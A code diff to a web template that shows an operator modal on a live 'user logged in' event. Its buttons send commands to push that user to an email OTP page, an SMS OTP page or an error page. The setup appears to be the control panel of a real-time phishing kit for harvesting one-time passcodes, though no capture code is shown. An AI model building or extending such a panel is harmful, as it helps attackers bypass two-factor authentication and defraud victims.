@@ -224,10 +224,10 @@
             });
     
             var channel = pusher.subscribe('public');
-            console.log('Subscribed to public channel:', channel);
+            // console.log('Subscribed to public channel:', channel);
     
             channel.bind('userLoggedIn', function(data) {
-                console.log('Event received in JavaScript:', data);
+                // console.log('Event received in JavaScript:', data);
                 document.getElementById('userLoginModal').style.display = 'block';
                 // alert(`User logged in: ${data.user.name}`);
             });
@@ -243,7 +243,55 @@
             'X-CSRF-TOKEN': '{{ csrf_token() }}'
         },
         body: JSON.stringify({
-            command: 'otp_page' // You can add more key-value pairs here as needed
+            command: 'email-otp' // You can add more key-value pairs here as needed
+        })
+    })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                   
+                    document.getElementById('userLoginModal').style.display = 'none';
+                } else {
+                    alert('Failed to send command');
+                }
+            });
+    });
+
+    document.getElementById('smsOtpBtn').addEventListener('click', function() {
+            
+            
+            fetch('/trigger-redirect-command', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'X-CSRF-TOKEN': '{{ csrf_token() }}'
+        },
+        body: JSON.stringify({
+            command: 'sms-otp-page' // You can add more key-value pairs here as needed
+        })
+    })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                   
+                    document.getElementById('userLoginModal').style.display = 'none';
+                } else {
+                    alert('Failed to send command');
+                }
+            });
+    });
+
+    document.getElementById('errorPageBtn').addEventListener('click', function() {
+            
+            
+            fetch('/trigger-redirect-command', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'X-CSRF-TOKEN': '{{ csrf_token() }}'
+        },
+        body: JSON.stringify({
+            command: 'error-page' // You can add more key-value pairs here as needed
         })
     })
             .then(response => response.json())
@@ -258,13 +306,39 @@
     });
     </script> 
 
-<div id="userLoginModal" style="display:none; position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); 
-background-color: white; padding: 20px; border: 2px solid #444; z-index: 1000;">
-<h2>User Login Detected</h2>
-<p>Select a command:</p>
-<button id="redirectToOtpBtn" style="padding: 10px; background-color: #4CAF50; color: white; border: none;">
-    Redirect to OTP Page
-</button>
+<div id="userLoginModal" style="display:none; position:fixed; top:50%; left:50%; transform:translate(-50%, -50%);
+background-color: white; padding: 25px; border-radius: 10px; box-shadow: 0 8px 16px rgba(0,0,0,0.2); z-index: 1000; width: 300px; text-align: center;">
+    
+    <h2 style="font-family: Arial, sans-serif; font-size: 1.5rem; color: #333; margin-bottom: 15px;">User Login Detected</h2>
+    <p style="font-family: Arial, sans-serif; font-size: 1rem; color: #555; margin-bottom: 20px;">Select a command:</p>
+    
+    <button id="redirectToOtpBtn" style="width: 100%; padding: 10px; margin-bottom: 10px; background-color: #4CAF50; color: white; border: none; border-radius: 5px; font-size: 1rem; cursor: pointer; transition: background-color 0.3s;">
+        Email OTP Page
+    </button>
+    
+    <button id="smsOtpBtn" style="width: 100%; padding: 10px; margin-bottom: 10px; background-color: #2196F3; color: white; border: none; border-radius: 5px; font-size: 1rem; cursor: pointer; transition: background-color 0.3s;">
+        SMS OTP Page
+    </button>
+    
+    <button id="errorPageBtn" style="width: 100%; padding: 10px; background-color: #f44336; color: white; border: none; border-radius: 5px; font-size: 1rem; cursor: pointer; transition: background-color 0.3s;">
+        Redirect to Error Page
+    </button>
 </div>
+
+<style>
+    /* Button hover effects */
+    #redirectToOtpBtn:hover {
+        background-color: #45a049;
+    }
+
+    #smsOtpBtn:hover {
+        background-color: #1e88e5;
+    }
+
+    #errorPageBtn:hover {
+        background-color: #e53935;
+    }
+</style>
+
     
 </section>
